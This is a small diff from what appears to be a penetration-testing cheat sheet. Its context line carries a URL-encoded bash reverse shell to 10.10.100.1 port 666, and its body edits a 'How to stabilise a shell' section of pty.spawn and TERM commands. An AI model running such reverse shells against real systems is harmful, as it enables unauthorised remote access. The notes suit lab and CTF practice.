@@ -44,8 +44,6 @@ bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E100%2E1%2F666%200%3E%261
 ## How to stabilise a shell:
 
 ```shell
-python -c "import pty; pty.spawn('/bin/bash')"
-
 python3 -c "import pty; pty.spawn('/bin/bash')"
 export TERM=xterm
 # Press -> Ctrl + Z
